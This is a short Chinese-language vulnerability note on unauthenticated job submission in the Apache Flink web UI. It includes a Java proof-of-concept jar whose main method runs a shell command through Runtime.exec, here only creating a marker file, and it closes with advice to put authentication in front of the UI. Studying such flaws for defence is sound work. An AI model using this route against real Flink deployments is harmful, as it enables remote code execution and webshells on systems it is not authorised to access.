### 一 漏洞描述
flink未授权创建任务

Flink支持上传jar包并且执行，所以这里可以通过上传jar包获取Webshell

### 二 漏洞利用
```angular2html
package com.test;

import java.io.IOException;

public class Main {

    public static void main(String[] args) throws IOException {
	// write your code here
        Runtime.getRuntime().exec(new String[]{"bash","-c","touch /tmp/ggg"});
    }
}
```
![img.png](img.png)


### 三 漏洞修复
针对flink ui进行授权访问，flink原生项目暂不支持授权功能，建议是用web容器的basic access功能配置认证。

> 参考链接: https://y4er.com/post/apache-flink-cve-2020-17518-17519-rce/#%E8%87%AA%E8%BA%AB%E5%8A%9F%E8%83%BDrce
